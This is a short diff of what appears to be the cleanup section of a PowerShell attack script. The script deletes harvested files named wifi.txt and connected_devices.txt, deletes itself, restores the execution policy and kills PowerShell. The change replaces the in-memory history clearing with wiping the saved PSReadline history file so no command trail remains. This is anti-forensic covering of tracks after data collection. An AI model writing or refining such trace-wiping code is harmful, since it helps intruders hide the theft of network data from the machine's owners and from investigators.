@@ -6,5 +6,5 @@ del wifi.txt
 del connected_devices.txt
 del fin.ps1
 Set-ExecutionPolicy restricted -Force
-[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+Clear-Content (Get-PSReadlineOption).HistorySavePath
 taskkill -F /IM powershell.exe
